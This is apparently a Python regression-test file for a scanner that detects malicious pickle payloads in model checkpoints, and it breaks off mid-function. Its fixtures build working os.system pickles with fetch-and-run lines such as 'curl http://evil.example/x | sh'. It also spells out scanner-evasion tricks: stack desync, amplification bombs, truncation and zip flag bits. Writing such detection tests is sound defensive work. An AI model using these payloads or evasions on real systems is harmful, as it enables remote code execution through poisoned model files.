"""Security-hardening regression tests for the model-file scanner.

Covers:
- _scan_pytorch_zip caps decompressed pickle-member size instead of trusting
  the zip's (attacker-controlled) declared file_size metadata -- prevents a
  small compressed .pt/.pth checkpoint from expanding to gigabytes in memory.
- _scan_joblib caps decompressed zlib-stream size the same way, instead of
  calling zlib.decompress(data) unbounded (DEF-33).
- scan_directory skips symlinks whose target escapes the scan root, mirroring
  the guard passes/file_scan.py already has (CWE-59/22).
- _scan_pickle logs a diagnostic instead of silently swallowing an opcode-
  analysis failure (bare except/pass), then still falls through to the raw
  byte-signature scan.
- _resolve_pickle_globals walks every pickle in a multi-pickle file, not just
  the first (torch's legacy save format), and .bin files are dispatched by
  content sniff instead of being skipped on extension.
"""

from __future__ import annotations

import io
import json
import logging
import os
import pickle
import struct
import sys
import tempfile
import zipfile
import zlib
from pathlib import Path

import pytest

from hayward import scanner as mfv_scanner
from hayward.findings import Severity, is_coverage_gap
from hayward.scanner import ModelFileScanner, _resolve_pickle_globals


def _short_binunicode(text: str) -> bytes:
    raw = text.encode()
    return bytes([0x8C, len(raw)]) + raw


def _os_system_pickle(command: str) -> bytes:
    """A standalone protocol-4 pickle calling os.system(command)."""
    return (
        b"\x80\x04"
        + _short_binunicode("os")
        + _short_binunicode("system")
        + b"\x93"
        + _short_binunicode(command)
        + b"\x85"
        + b"R."
    )


def _legacy_torch_layout(payload: bytes) -> bytes:
    """Reproduce torch's legacy (non-zip) `_legacy_save` layout: a magic
    number, a protocol version and a sys_info dict, each pickled separately,
    and only then the real object -- four concatenated pickles."""
    return (
        pickle.dumps(0x1950A86A20F9469CFC6C, protocol=2)
        + pickle.dumps(1001, protocol=2)
        + pickle.dumps({"little_endian": True, "protocol_version": 1001, "type_sizes": {}}, protocol=2)
        + payload
    )


class TestMultiPickleStreamWalk:
    """A pickle stream ends at its first STOP opcode, but torch's legacy save
    format concatenates four pickles and puts the real state_dict in #4.
    Walking only to the first STOP examined a 14-byte magic-number pickle and
    called the file clean, so a plain `os.system(...)` in the state_dict
    position produced ZERO findings -- defeating the CRITICAL deny list, the
    unknown-global re-triage and every other check in the module at once.
    Found while building the benign pickle benchmark corpus.
    """

    def test_os_system_in_legacy_state_dict_position_is_critical(self, tmp_path):
        data = _legacy_torch_layout(_os_system_pickle("curl http://evil.example/x | sh"))
        p = tmp_path / "legacy_backdoor.pt"
        p.write_bytes(data)

        findings = ModelFileScanner().scan_file(p)
        critical = [f for f in findings if f.rule_id == "MFV-PICKLE-001"]
        assert critical, (
            f"legacy-format backdoor evaded the scanner entirely: "
            f"{[(f.rule_id, f.severity) for f in findings]}"
        )
        assert critical[0].severity == Severity.CRITICAL
        assert "curl http://evil.example/x | sh" in critical[0].message

    def test_globals_from_every_pickle_in_the_stream_are_resolved(self):
        """Not just the last one -- each concatenated pickle contributes."""
        data = (
            _os_system_pickle("first")
            + pickle.dumps({"benign": 1}, protocol=2)
            + _os_system_pickle("second")
        )
        globals_found, resolved_calls, _memo = _resolve_pickle_globals(data)

        assert globals_found.count("os.system") == 2
        assert [c.args[0] for c in resolved_calls if c.ref == "os.system"] == ["first", "second"]

    def test_trailing_non_pickle_bytes_end_the_walk_without_losing_findings(self):
        """The legacy format follows its pickles with raw tensor storage.
        That must terminate the walk normally, keeping what was resolved."""
        data = _legacy_torch_layout(_os_system_pickle("id")) + b"\x00\x01\x02RAW-TENSOR-BYTES\xff"

        globals_found, resolved_calls, _memo = _resolve_pickle_globals(data)
        assert "os.system" in globals_found
        assert any(c.args == ("id",) for c in resolved_calls)

    def test_wholly_unparseable_stream_still_raises_for_the_caller(self):
        """`_scan_pickle` depends on a first-pickle failure propagating so it
        can fall back to the raw byte-signature scan. Only failures on a
        *later* pickle are swallowed."""
        try:
            _resolve_pickle_globals(b"\xff\xfe not a pickle at all")
        except Exception:
            return
        raise AssertionError("expected an unparseable first pickle to raise")

    def test_memo_does_not_leak_between_concatenated_pickles(self):
        """Each pickle gets a fresh stack and memo, like consecutive
        Unpickler.load() calls. A memo index reused across pickles must not
        resolve to the earlier pickle's object."""
        data = pickle.dumps(["sentinel-value"], protocol=2) + _os_system_pickle("clean")

        _globals, resolved_calls, _memo = _resolve_pickle_globals(data)
        calls = [c for c in resolved_calls if c.ref == "os.system"]
        assert calls and calls[0].args == ("clean",)


class _RunsShell:
    """Pickles to `os.system('curl ... | sh')`, the standard REDUCE payload."""

    def __reduce__(self):
        return (os.system, ("curl http://example.invalid | sh",))


class TestTruncatedPickleReportsCoverage:
    """A pickle that never reaches its STOP opcode was not read to the end,
    and whatever sat past the cut was never examined. The scanner reported
    nothing at all for one: a 300KB pickle whose `os.system` call sat behind
    the padding was CRITICAL whole and *silent* cut in half, which is the
    "Art of Hide and Seek" shape (arXiv 2508.19774) reached by nothing more
    than a partial download. Silence there also blocks scanning a remote
    checkpoint through HTTP range requests, since a prefix cannot be trusted
    without a termination check.
    """

    def _padded_payload(self) -> bytes:
        """A pickle whose os.system call sits behind 300KB of padding."""
        return pickle.dumps(
            {"padding": "x" * 300_000, "evil": _RunsShell()}, protocol=4,
        )

    def test_whole_file_is_critical(self, tmp_path):
        """The premise: cut nothing and the payload is found."""
        p = tmp_path / "full.pt"
        p.write_bytes(self._padded_payload())

        findings = ModelFileScanner().scan_file(p)
        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings)
        assert not any(f.rule_id == "MFV-SKIP-003" for f in findings)

    def test_truncated_mid_opcode_reports_a_coverage_gap(self, tmp_path):
        """Cut inside the padding string's argument, so the parse asks for
        more bytes than remain."""
        p = tmp_path / "cut.pt"
        p.write_bytes(self._padded_payload()[:150_000])

        findings = ModelFileScanner().scan_file(p)
        skips = [f for f in findings if f.rule_id == "MFV-SKIP-003"]
        assert skips, (
            f"truncated pickle hiding os.system past the cut scanned clean: "
            f"{[f.rule_id for f in findings]}"
        )
        assert is_coverage_gap(skips[0])
        assert skips[0].metadata["skipped_reason"] == "pickle_truncated"

    def test_ran_out_before_stop_reports_a_coverage_gap(self, tmp_path):
        """Cut on an opcode boundary instead, so the parse ends tidily with
        the STOP simply never arriving. No exception is raised, which is the
        quieter half of the same gap."""
        p = tmp_path / "no_stop.pkl"
        p.write_bytes(pickle.dumps({"weights": [1, 2, 3]}, protocol=4)[:-1])

        findings = ModelFileScanner().scan_file(p)
        assert any(f.rule_id == "MFV-SKIP-003" for f in findings), (
            f"pickle missing its STOP opcode scanned clean: "
            f"{[f.rule_id for f in findings]}"
        )

    def test_complete_legacy_torch_file_is_not_flagged(self, tmp_path):
        """The legacy layout ends its four pickles and then writes raw tensor
        storage. Storage is not a truncated stream, and calling it one would
        put a coverage gap on every legacy checkpoint there is."""
        p = tmp_path / "legacy.pt"
        p.write_bytes(
            _legacy_torch_layout(pickle.dumps({"w": [1.0, 2.0]}, protocol=2))
            + b"\x00\x01\x02RAW-TENSOR-BYTES\xff"
        )

        findings = ModelFileScanner().scan_file(p)
        assert not any(f.rule_id == "MFV-SKIP-003" for f in findings), (
            f"complete legacy checkpoint reported as truncated: "
            f"{[f.rule_id for f in findings]}"
        )

    def test_legacy_torch_truncated_in_its_last_pickle_is_flagged(self, tmp_path):
        """The three header pickles terminate, so a check that only asked
        "did anything reach STOP" would miss this. The state_dict pickle is
        the one that got cut."""
        p = tmp_path / "legacy_cut.pt"
        p.write_bytes(
            _legacy_torch_layout(pickle.dumps({"w": "y" * 5_000}, protocol=2))[:-3_000]
        )

        findings = ModelFileScanner().scan_file(p)
        assert any(f.rule_id == "MFV-SKIP-003" for f in findings), (
            f"legacy checkpoint cut inside its state_dict scanned clean: "
            f"{[f.rule_id for f in findings]}"
        )

    def test_non_pickle_bytes_stay_silent(self, tmp_path):
        """Raw float data trips the two-byte opener sniff constantly, and it
        dies on an unreadable opcode with bytes to spare rather than running
        off the end. That is unparseable content, not a short file, and it
        must stay silent or every torch checkpoint grows a coverage gap."""
        assert not mfv_scanner._pickle_stream_truncated(struct.pack("<512d", *([1.5] * 512)))

    def test_storage_after_a_complete_pickle_stays_silent(self, tmp_path):
        """The shape that actually occurs: torch's legacy layout puts raw
        tensor storage after its pickles. The storage does not open with PROTO,
        so the walk stops at the boundary rather than calling the tensors a
        truncated stream.

        This replaces an assertion that fed `os.urandom` to the check. Opcode
        decoding succeeds on far more byte sequences than are pickles, so
        roughly one random buffer in fifty that opens with a PROTO marker
        decodes all the way to the end and is reported as truncated. That is a
        real limit, recorded in docs/coverage.md, not something a seed should
        be chosen to hide.
        """
        pickles = b"".join(
            pickle.dumps(v, protocol=2) for v in (1234, 2, {"little_endian": True})
        )
        storage = struct.pack("<1024d", *([0.5] * 1024))
        assert not mfv_scanner._pickle_stream_truncated(pickles + storage)


class TestStackDesyncViaUnsimulatedPushes:
    """Opcodes that push a value the walk cannot resolve -- PERSID/BINPERSID
    (persistent-ID lookup), EXT1/EXT2/EXT4 (copyreg extension registry),
    NEXT_BUFFER (protocol-5 out-of-band buffer) -- must still push a
    placeholder. The value is unknowable; the push is not optional.

    Skipping the push desynchronizes the simulated stack against the real VM
    for every following opcode, and that was a three-byte evasion: `EXT1`
    then `POP` leaves the real stack untouched (push then pop) while the walk,
    having pushed nothing, popped the callable instead. A `pip.main(url)` that
    still executes on load resolved to no call at all and fell from HIGH back
    to the suppressed INFO bucket.

    Found by auditing the walker against pickletools' full 68-opcode table
    rather than by any rule review. The `_PICKLE_OPAQUE` docstring already
    claimed PERSID and EXT lookups were handled this way; only the code
    disagreed.
    """

    @staticmethod
    def _pip_main_with(injected: bytes, proto: bytes = b"\x80\x04") -> bytes:
        return (
            proto
            + _short_binunicode("pip") + _short_binunicode("main") + b"\x93"
            + injected
            + _short_binunicode("http://evil.example/pypi")
            + b"\x85"
            + b"R."
        )

    @pytest.mark.parametrize("label, injected, proto", [
        ("EXT1", b"\x82\x01" + b"0", b"\x80\x04"),
        ("EXT2", b"\x83\x01\x00" + b"0", b"\x80\x04"),
        ("EXT4", b"\x84\x01\x00\x00\x00" + b"0", b"\x80\x04"),
        ("NEXT_BUFFER", b"\x97" + b"0", b"\x80\x05"),
        ("PERSID", b"Pxyz\n" + b"0", b"\x80\x02"),
    ])
    def test_push_then_pop_does_not_hide_the_call(self, label, injected, proto):
        data = self._pip_main_with(injected, proto)

        globals_found, resolved_calls, _memo = _resolve_pickle_globals(data)
        assert "pip.main" in globals_found
        calls = [c for c in resolved_calls if c.ref == "pip.main"]
        assert calls, (
            f"{label} push/pop desynced the stack and hid the call entirely; "
            f"resolved: {[c.format() for c in resolved_calls]}"
        )
        assert calls[0].args == ("http://evil.example/pypi",)

    def test_escalation_survives_the_desync_attempt(self, tmp_path):
        """End to end: the finding must stay above the suppressed INFO tier."""
        p = tmp_path / "desync.pkl"
        p.write_bytes(self._pip_main_with(b"\x82\x01" + b"0"))

        findings = ModelFileScanner().scan_file(p)
        actionable = [f for f in findings if f.severity != Severity.INFO]
        assert actionable, f"{[(f.rule_id, f.severity) for f in findings]}"
        assert any("pip.main" in f.message for f in actionable)

    def test_denied_globals_were_never_vulnerable_to_this(self, tmp_path):
        """Worth pinning because it explains the blast radius: globals_found
        is appended at GLOBAL time, independent of the stack, so a denied
        callable stays CRITICAL no matter how desynced the simulation gets.
        The desync only ever hid argument evidence, which is why it mattered
        exactly in the unknown bucket where the bypass gadgets live."""
        p = tmp_path / "desync_denied.pkl"
        p.write_bytes(
            b"\x80\x04"
            + _short_binunicode("os") + _short_binunicode("system") + b"\x93"
            + b"\x82\x01" + b"0"
            + _short_binunicode("id") + b"\x85" + b"R."
        )

        findings = ModelFileScanner().scan_file(p)
        assert any(
            f.rule_id == "MFV-PICKLE-001" and f.severity == Severity.CRITICAL
            for f in findings
        )

    def test_every_stack_affecting_opcode_is_simulated(self):
        """Guards the audit itself. Any future pickle protocol opcode that
        touches the stack and is not handled reopens this desync class, so the
        walker is checked against pickletools' own opcode table rather than
        against a list maintained here. STOP is the sole exemption: genops
        ends the walk there."""
        import pickletools
        import re

        import hayward.scanner as scanner_module

        handled: set[str] = set()
        for attr in (
            "_STRING_PUSH_OPCODES", "_INT_PUSH_OPCODES", "_FLOAT_PUSH_OPCODES",
            "_BYTES_PUSH_OPCODES", "_MEMO_STORE_OPCODES", "_MEMO_FETCH_OPCODES",
            "_OPAQUE_PUSH_OPCODES",
        ):
            handled |= set(getattr(scanner_module, attr))

        source = Path(scanner_module.__file__).read_text(encoding="utf-8")
        body = source[
            source.index("def _walk_one_pickle"):source.index("def _classify_pickle_global")
        ]
        handled |= set(re.findall(r'name == "([A-Z_0-9]+)"', body))

        unhandled = sorted(
            op.name for op in pickletools.opcodes
            if op.name not in handled and (op.stack_before or op.stack_after)
        )
        assert unhandled == ["STOP"], (
            f"stack-affecting opcodes are not simulated, which desyncs the "
            f"walk for every following opcode: {unhandled}"
        )


class TestDupAmplification:
    """`DUP` pushes a second reference to the same object, so the simulated
    stack is a DAG, not a tree. `DUP TUPLE2` costs two bytes, adds one level
    of depth, and doubles the node count any naive traversal would walk.
    Repeating it is the pickle spelling of a billion-laughs attack, shipped by
    ColdwaterQ as `billionLaughs.pt` alongside the DEFCON 30 talk.

    It hit this module in two places:

      - `_is_pickle_literal` (and the two argument walkers) traversed every
        path: 6.9 seconds on a 73-byte file, doubling per extra round.
      - `PickleResolvedCall.format()` called plain `repr()`, rendering a
        218MB message from that same 73-byte file -- which then goes into a
        finding, gets serialized to JSON/SARIF, and printed.

    For a scanner both are evasions rather than mere slowdowns: a scan that
    stalls or gets OOM-killed reports nothing at all.
    """

    @staticmethod
    def _amplified(rounds: int, module: str = "os", name: str = "system") -> bytes:
        payload = (
            b"\x80\x04"
            + _short_binunicode(module) + _short_binunicode(name) + b"\x93"
            + _short_binunicode("AAAA") + b"\x85"
        )
        for _ in range(rounds):
            payload += b"2" + b"\x86"   # DUP + TUPLE2 -> (x, x)
        return payload + b"\x85" + b"R."

    @pytest.mark.parametrize("rounds", [16, 24, 40])
    def test_analysis_stays_fast_regardless_of_amplification(self, rounds):
        import time

        data = self._amplified(rounds)
        assert len(data) < 200, "fixture should stay tiny; that is the whole point"

        start = time.monotonic()
        globals_found, _calls, _memo = _resolve_pickle_globals(data)
        elapsed = time.monotonic() - start

        assert "os.system" in globals_found
        assert elapsed < 5.0, (
            f"2^{rounds} logical nodes from {len(data)} bytes took {elapsed:.1f}s; "
            f"the shared-reference memo is not working"
        )

    @pytest.mark.parametrize("rounds", [16, 24, 40])
    def test_finding_message_stays_bounded(self, tmp_path, rounds):
        p = tmp_path / f"amplified_{rounds}.pkl"
        p.write_bytes(self._amplified(rounds))

        findings = ModelFileScanner().scan_file(p)
        critical = [f for f in findings if f.rule_id == "MFV-PICKLE-001"]
        assert critical, "amplification must not cost detection"
        assert critical[0].severity == Severity.CRITICAL

        message = critical[0].message
        assert len(message) < 5000, (
            f"message grew to {len(message):,} chars from a {len(p.read_bytes())}-byte "
            f"file; the bounded renderer is not being used"
        )

    def test_message_size_does_not_grow_with_amplification(self, tmp_path):
        """The sharpest form of the assertion: doubling the logical node count
        must not change the output size at all."""
        sizes = set()
        for rounds in (18, 26, 34):
            p = tmp_path / f"n{rounds}.pkl"
            p.write_bytes(self._amplified(rounds))
            findings = ModelFileScanner().scan_file(p)
            sizes.add(len(findings[0].message))
        assert len(sizes) == 1, f"message length varied with amplification: {sizes}"

    def test_shared_references_do_not_break_ordinary_resolution(self):
        """The memo must not cause a legitimately repeated literal to be
        dropped from the resolved arguments."""
        data = (
            b"\x80\x04"
            + _short_binunicode("os") + _short_binunicode("system") + b"\x93"
            + _short_binunicode("id") + b"2"      # DUP -> same string twice
            + b"\x86"                              # TUPLE2 -> ('id', 'id')
            + b"\x85"                              # TUPLE1 -> (('id','id'),)
            + b"R."
        )
        _globals_found, calls, _memo = _resolve_pickle_globals(data)
        assert calls and calls[0].args == (("id", "id"),)
        assert "id" in calls[0].format()


class TestPartialWalkSalvage:
    """joblib interleaves raw numpy array bytes *into* the pickle stream, so
    the very first pickle stops parsing partway through -- at byte 911 of
    183761 in a stock `hholb/sklearn-iris` model, after five globals had
    already been resolved.

    Re-raising there threw those five away and dropped the file onto
    `_scan_pickle`'s raw-byte-signature fallback, which means real sklearn
    models were analysed by substring match alone: the weak path this whole
    module exists to replace. Partial opcode evidence beats it every time.

    The contract for a *wholly* unparseable stream is unchanged -- it still
    raises, so the fallback still exists for files that really are garbage.
    """

    def test_globals_before_a_mid_stream_failure_are_kept(self):
        truncated = (
            b"\x80\x04"
            + _short_binunicode("os") + _short_binunicode("system") + b"\x93"
            + b"\x0f"          # not a pickle opcode: stream dies here
        )
        globals_found, _calls, _memo = _resolve_pickle_globals(truncated)
        assert "os.system" in globals_found

    def test_payload_before_a_mid_stream_failure_is_still_critical(self, tmp_path):
        """The security-relevant half: a gadget resolved before the stream
        breaks must still produce a finding."""
        p = tmp_path / "truncated.pkl"
        p.write_bytes(
            b"\x80\x04"
            + _short_binunicode("os") + _short_binunicode("system") + b"\x93"
            + _short_binunicode("curl http://evil.example/x | sh") + b"\x85"
            + b"R"
            + b"\x0f\x0e\x0d"   # joblib-style raw bytes follow
        )
        findings = ModelFileScanner().scan_file(p)
        assert any(
            f.rule_id == "MFV-PICKLE-001" and f.severity == Severity.CRITICAL
            for f in findings
        ), f"{[(f.rule_id, f.severity) for f in findings]}"

    def test_stream_that_resolves_nothing_still_raises(self):
        """Unchanged contract. `_scan_pickle` depends on this to fall back to
        its raw byte-signature scan, so salvage must not swallow the failure
        when there is nothing to salvage."""
        try:
            _resolve_pickle_globals(b"\xff\xfe not a pickle at all")
        except Exception:
            return
        raise AssertionError("expected a stream resolving nothing to raise")


class TestAmbiguousBinExtension:
    """`pytorch_model.bin` is the most common pickle-bearing file on
    HuggingFace, and `.bin` was absent from _format_map -- scan_file returned
    [] without reading a byte. It can't simply be mapped to PICKLE either,
    since `.bin` is also every unrelated binary blob, so content decides."""

    def test_malicious_pytorch_model_bin_is_scanned(self, tmp_path):
        p = tmp_path / "pytorch_model.bin"
        p.write_bytes(_os_system_pickle("curl http://evil.example/x | sh"))

        findings = ModelFileScanner().scan_file(p)
        assert any(f.rule_id == "MFV-PICKLE-001" and f.severity == Severity.CRITICAL for f in findings)

    def test_legacy_format_bin_is_scanned(self, tmp_path):
        """The two gaps compose: a legacy-layout payload under a .bin name
        was doubly invisible."""
        p = tmp_path / "pytorch_model.bin"
        p.write_bytes(_legacy_torch_layout(_os_system_pickle("id")))

        findings = ModelFileScanner().scan_file(p)
        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings)

    def test_unidentifiable_bin_is_still_skipped(self, tmp_path):
        """Content sniffing must not turn every stray binary into a scan
        target; an unrecognizable .bin is skipped exactly as before."""
        p = tmp_path / "weights.bin"
        p.write_bytes(bytes(range(256)) * 64)

        assert ModelFileScanner().scan_file(p) == []

    def test_directory_scan_discovers_bin_files(self, tmp_path):
        """scan_file accepting .bin is not enough: scan_directory globs its own
        extension list, so a malicious pytorch_model.bin was scannable when
        named directly and invisible to the directory scan that is how the tool
        actually gets run. Caught by the picklebench corpus, not by unit tests."""
        (tmp_path / "pytorch_model.bin").write_bytes(_os_system_pickle("id"))

        findings = ModelFileScanner().scan_directory(tmp_path)
        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings), (
            f"directory scan missed a malicious .bin: {[f.rule_id for f in findings]}"
        )

    def test_benign_zip_format_bin_produces_no_findings(self, tmp_path):
        """A real zip-format pytorch_model.bin holding an ordinary state dict
        must scan clean -- this is the path the benchmark corpus exercises."""
        p = tmp_path / "pytorch_model.bin"
        with zipfile.ZipFile(p, "w") as zf:
            zf.writestr("archive/data.pkl", pickle.dumps({"weight": [1.0, 2.0]}, protocol=2))

        assert ModelFileScanner().scan_file(p) == []


class TestUnmappedExtensionIsSniffed:
    """`danger.dat` in the canary repo mcpotato/42-eicar-street is a real
    `builtins.eval` pickle, and scan_file returned [] for it: the extension was
    neither in _format_map nor in _AMBIGUOUS_EXTENSIONS, so the file was never
    read. The identical bytes named `.pkl` reported CRITICAL. Renaming is the
    cheapest evasion there is, so an explicitly named path is decided by
    content."""

    def test_malicious_pickle_under_unmapped_extension_is_scanned(self, tmp_path):
        p = tmp_path / "danger.dat"
        p.write_bytes(_os_system_pickle("curl http://evil.example/x | sh"))

        findings = ModelFileScanner().scan_file(p)
        assert any(
            f.rule_id == "MFV-PICKLE-001" and f.severity == Severity.CRITICAL
            for f in findings
        ), f"unmapped extension skipped a malicious pickle: {[f.rule_id for f in findings]}"

    def test_extension_does_not_change_the_verdict(self, tmp_path):
        """The same bytes under two names must produce the same rule ids."""
        payload = _os_system_pickle("id")
        (tmp_path / "danger.dat").write_bytes(payload)
        (tmp_path / "danger.pkl").write_bytes(payload)

        scanner = ModelFileScanner()
        as_dat = [f.rule_id for f in scanner.scan_file(tmp_path / "danger.dat")]
        as_pkl = [f.rule_id for f in scanner.scan_file(tmp_path / "danger.pkl")]
        assert as_dat == as_pkl

    def test_file_with_no_extension_is_scanned(self, tmp_path):
        p = tmp_path / "danger"
        p.write_bytes(_os_system_pickle("id"))

        assert any(f.rule_id == "MFV-PICKLE-001" for f in ModelFileScanner().scan_file(p))

    def test_unidentifiable_file_is_still_skipped(self, tmp_path):
        """Sniffing every named path must not turn ordinary files into scan
        targets: nothing _sniff_format can identify means no finding."""
        p = tmp_path / "notes.txt"
        p.write_bytes(b"just some text, not a model\n" * 100)

        assert ModelFileScanner().scan_file(p) == []

    def test_oversized_unmapped_file_reports_the_gap(self, tmp_path, monkeypatch):
        """Padding a payload past the size cap and renaming it must not buy
        silence: the file is named, it was not read, so it is a coverage gap."""
        p = tmp_path / "payload.dat"
        p.write_bytes(_os_system_pickle("id"))
        scanner = ModelFileScanner()
        monkeypatch.setattr(scanner, "MAX_SCAN_BYTES", 8)

        findings = scanner.scan_file(p)
        assert [f.rule_id for f in findings] == ["MFV-SKIP-001"]

    def test_directory_scan_still_filters_by_extension(self, tmp_path):
        """Deliberate asymmetry: a directory walk that read every file to sniff
        it would cost a full read of the whole tree, so discovery stays on the
        extension list. Documented in docs/coverage.md."""
        (tmp_path / "danger.dat").write_bytes(_os_system_pickle("id"))

        assert ModelFileScanner().scan_directory(tmp_path) == []


class TestZipMemberSizeCap:
    def test_scan_pytorch_zip_caps_oversized_member(self, tmp_path, monkeypatch):
        scanner = ModelFileScanner()
        monkeypatch.setattr(scanner, "MAX_ZIP_MEMBER_BYTES", 1000)

        zip_path = tmp_path / "model.pt"
        # Highly compressible payload so a tiny compressed size still expands
        # past the (lowered, for-test) cap -- mirrors a zip-bomb shape.
        payload = b"A" * 5000
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("archive/data.pkl", payload)

        findings = scanner._scan_pytorch_zip(zip_path)
        assert any(f.rule_id == "MFV-PICKLE-003" for f in findings)

    def test_scan_pytorch_zip_normal_member_still_scanned(self, tmp_path):
        scanner = ModelFileScanner()
        zip_path = tmp_path / "model.pt"
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("archive/data.pkl", b"not a real pickle but small")

        findings = scanner._scan_pytorch_zip(zip_path)
        assert not any(f.rule_id == "MFV-PICKLE-003" for f in findings)


class TestJoblibDecompressionSizeCap:
    """DEF-33: _scan_joblib called zlib.decompress(data) with no bound on
    output size -- a joblib file well under MAX_SCAN_BYTES can still decompress
    into a memory-exhausting payload (DEFLATE's worst-case expansion is
    roughly 1000:1+). _scan_joblib now uses the same bounded-chunk approach
    _read_zip_member_capped already uses for zip-backed formats
    (_decompress_zlib_capped), aborting once the running total exceeds the
    same cap used for zip members."""

    def test_joblib_decompression_is_size_capped(self, tmp_path, monkeypatch):
        scanner = ModelFileScanner()
        monkeypatch.setattr(scanner, "MAX_ZIP_MEMBER_BYTES", 1000)

        joblib_path = tmp_path / "model.joblib"
        # Highly compressible payload so a tiny compressed stream still
        # expands past the (lowered, for-test) cap -- mirrors a zip-bomb shape.
        payload = b"A" * 5000
        joblib_path.write_bytes(zlib.compress(payload))

        findings = scanner.scan_file(joblib_path)
        assert any(f.rule_id == "MFV-JOBLIB-002" for f in findings)

    def test_joblib_normal_compressed_payload_still_scanned(self, tmp_path):
        scanner = ModelFileScanner()
        joblib_path = tmp_path / "model.joblib"
        joblib_path.write_bytes(zlib.compress(b"not a real pickle but small"))

        findings = scanner.scan_file(joblib_path)
        assert not any(f.rule_id == "MFV-JOBLIB-002" for f in findings)


class TestScanDirectorySymlinkGuard:
    def test_skips_symlink_escaping_root(self, tmp_path):
        outside_dir = Path(tempfile.mkdtemp())
        secret = outside_dir / "secret.safetensors"
        secret.write_bytes(b"xx")  # too-small -- would trigger MFV-ST-001 if read

        link = tmp_path / "evil_link.safetensors"
        link.symlink_to(secret)

        scanner = ModelFileScanner()
        findings = scanner.scan_directory(tmp_path)
        assert all(f.file_path != str(link) for f in findings)

    def test_still_scans_real_files_in_root(self, tmp_path):
        real = tmp_path / "model.safetensors"
        real.write_bytes(b"xx")  # too-small -- triggers MFV-ST-001

        scanner = ModelFileScanner()
        findings = scanner.scan_directory(tmp_path)
        assert any(f.file_path == str(real) and f.rule_id == "MFV-ST-001" for f in findings)


class TestPickleOpcodeFailureLogged:
    def test_corrupted_pickle_logs_debug_and_falls_through_to_byte_scan(self, tmp_path, caplog):
        p = tmp_path / "model.pkl"
        # Not a valid pickle stream at all, but contains a raw danger signature
        # so Method 2 (byte scan) should still catch it after opcode analysis fails.
        p.write_bytes(b"not a real pickle stream \x00\xff__reduce__ garbage")

        scanner = ModelFileScanner()
        with caplog.at_level(logging.DEBUG):
            findings = scanner.scan_file(p)

        assert any(f.rule_id == "MFV-PICKLE-002" for f in findings)
        assert any(
            "opcode analysis failed" in r.message.lower() for r in caplog.records
        )


class _EvilPayload:
    """Reduces to os.system(...), a genuine malicious pickle payload."""

    def __reduce__(self):
        import os
        return (os.system, ("echo pwned",))


class TestPthExtensionOverload:
    """`.pth` is also Python's own path-configuration format (setuptools,
    virtualenv, editable installs): a plain-text list of directories plus
    optional `import ...` lines. Those are not pickles, so opcode analysis
    raised and MFV-PICKLE-002's raw-byte fallback matched the `__import__`
    text in them, reporting a HIGH-severity finding. Measured across
    scan-targets/: 9 of 9 `.pth` files were path-configuration files and none
    was a checkpoint. Same reasoning as the existing `saved_model.pb` guard:
    an extension other tooling also uses is not on its own evidence of format.
    """

    def test_path_configuration_pth_is_not_scanned(self, tmp_path):
        pth = tmp_path / "distutils-precedence.pth"
        pth.write_text(
            "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
            "enabled = os.environ.get(var, 'local') == 'local'; "
            "enabled and __import__('_distutils_hack').add_shim();\n",
            encoding="utf-8",
        )
        assert ModelFileScanner().scan_file(pth) == []

    def test_real_protocol2_pth_checkpoint_is_still_scanned(self, tmp_path):
        """Negative control: torch.save() writes either a ZIP or a protocol-2+
        pickle (PROTO opcode `\\x80`), and both must still be analysed."""
        import pickle

        malicious = tmp_path / "model.pth"
        malicious.write_bytes(pickle.dumps(_EvilPayload(), protocol=2))
        assert malicious.read_bytes()[:1] == b"\x80"

        findings = ModelFileScanner().scan_file(malicious)
        assert any(f.rule_id == "MFV-PICKLE-001" for f in findings), (
            "a protocol-2 .pth carrying os.system must still be flagged"
        )

    def test_zip_backed_pth_checkpoint_is_still_scanned(self, tmp_path):
        import pickle

        pth = tmp_path / "model.pth"
        with zipfile.ZipFile(pth, "w") as zf:
            zf.writestr("archive/data.pkl", pickle.dumps(_EvilPayload(), protocol=2))
        assert pth.read_bytes()[:4] == b"PK\x03\x04"

        findings = ModelFileScanner().scan_file(pth)
        assert findings, "a zip-backed .pth checkpoint must still be scanned"


class TestScanDirectorySkipsVendoredTrees:
    """Directory discovery once ignored the shared skip set: it excluded
    only `.git`/`__pycache__` by substring, so it scanned the target's own
    installed dependencies under `.venv/lib/.../site-packages`."""

    def test_virtualenv_and_site_packages_are_skipped(self, tmp_path):
        import pickle

        payload = pickle.dumps(_EvilPayload(), protocol=2)

        vendored = tmp_path / ".venv" / "lib" / "python3.12" / "site-packages"
        vendored.mkdir(parents=True)
        (vendored / "dep.pkl").write_bytes(payload)

        own = tmp_path / "models"
        own.mkdir()
        (own / "model.pkl").write_bytes(payload)

        findings = ModelFileScanner().scan_directory(tmp_path)
        names = {Path(f.file_path).name for f in findings}
        assert "model.pkl" in names, "the project's own model file must still be scanned"
        assert "dep.pkl" not in names, "files under .venv/site-packages must be skipped"


class TestZipFlagBitBypass:
    """A zip member the strict reader refuses is not evidence of safety.

    The general-purpose flag bits for "encrypted" (0x1), "compressed patched
    data" (0x20) and "strong encryption" (0x40) are attacker-controlled and
    unauthenticated. Setting one makes Python's `zipfile` raise, while the
    member is plainly STORED and readable, and loaders with their own zip
    reader (torch ships a miniz-based one) go straight past it.

    `_scan_pytorch_zip` used to `continue` on that exception, which turned a
    three-byte header edit into a total bypass on `.pt`, the most common
    PyTorch checkpoint format. Found in picklescan's corpus, which carries the
    same trick as `.zip`; the `.pt` case is the one that matters, because that
    is a format the scanner already claimed to handle.
    """

    @staticmethod
    def _checkpoint(flag: int = 0, member: str = "archive/data.pkl",
                    payload: bytes | None = None,
                    compress: int = zipfile.ZIP_STORED) -> bytes:
        import struct as _struct

        body = payload if payload is not None else (
            b"\x80\x04"
            + _short_binunicode("os") + _short_binunicode("system") + b"\x93"
            + _short_binunicode("echo MARKER") + b"\x85" + b"R."
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", compress) as zf:
            zf.writestr(member, body)
        raw = bytearray(buf.getvalue())
        if flag:
            for sig, off in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
                i = 0
                while True:
                    i = raw.find(sig, i)
                    if i < 0:
                        break
